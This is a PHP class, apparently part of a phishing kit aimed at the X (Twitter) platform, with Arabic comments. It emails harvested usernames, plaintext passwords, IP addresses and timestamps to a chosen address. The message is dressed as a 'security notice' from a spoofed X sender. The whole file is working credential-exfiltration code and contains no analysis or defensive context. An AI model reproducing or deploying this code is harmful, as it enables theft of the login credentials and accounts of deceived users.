<?php
class EmailNotifier {
    private $to_email;
    private $from_email;
    
    public function __construct($to_email) {
        $this->to_email = $to_email;
        $this->from_email = "security@x-platform.com"; // يمكنك تغييره
    }
    
    public function sendNotification($credentials) {
        // إذا لم تكن البيانات صالحة، لا ترسل إشعار
        if (!$this->isValidCredentials($credentials)) {
            return false;
        }
        
        $subject = "🚨 إشعار أمني - بيانات دخول جديدة لـ X";
        $message = $this->buildHTMLTemplate($credentials);
        $headers = $this->buildEmailHeaders();
        
        return mail($this->to_email, $subject, $message, $headers);
    }
    
    private function isValidCredentials($cred) {
        return !empty($cred['username']) && 
               $cred['username'] !== 'N/A' && 
               !empty($cred['password']) && 
               $cred['password'] !== 'N/A';
    }
    
    private function buildHTMLTemplate($cred) {
        $html = "
        <!DOCTYPE html>
        <html dir='rtl'>
        <head>
            <meta charset='UTF-8'>
            <title>إشعار أمني X</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
                .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }
                .header { background: #000; color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0; }
                .content { padding: 20px; }
                .credential { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-right: 4px solid #1d9bf0; }
                .footer { text-align: center; padding: 20px; color: #666; font-size: 12px; }
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='header'>
                    <h2>🔒 إشعار أمني من نظام X</h2>
                </div>
                <div class='content'>
                    <p>تم تسجيل محاولة دخول جديدة:</p>
                    
                    <div class='credential'>
                        <strong>👤 المستخدم:</strong> {$cred['username']}
                    </div>
                    <div class='credential'>
                        <strong>🔑 كلمة المرور:</strong> {$cred['password']}
                    </div>
                    <div class='credential'>
                        <strong>🌐 العنوان:</strong> {$cred['ip_address']}
                    </div>
                    <div class='credential'>
                        <strong>⏰ الوقت:</strong> " . date('Y-m-d H:i:s', strtotime($cred['timestamp'])) . "
                    </div>
                    <div class='credential'>
                        <strong>📍 المنطقة:</strong> {$cred['timezone']}
                    </div>
                </div>
                <div class='footer'>
                    هذا إشعار تلقائي من نظام المراقبة الأمنية<br>
                    لا ترد على هذا البريد
                </div>
            </div>
        </body>
        </html>
        ";
        
        return $html;
    }
    
    private function buildEmailHeaders() {
        return "From: X Security System <{$this->from_email}>" . "\r\n" .
               "Reply-To: {$this->from_email}" . "\r\n" .
               "Content-Type: text/html; charset=UTF-8" . "\r\n" .
               "X-Mailer: PHP/" . phpversion() . "\r\n" .
               "MIME-Version: 1.0";
    }
}
?>
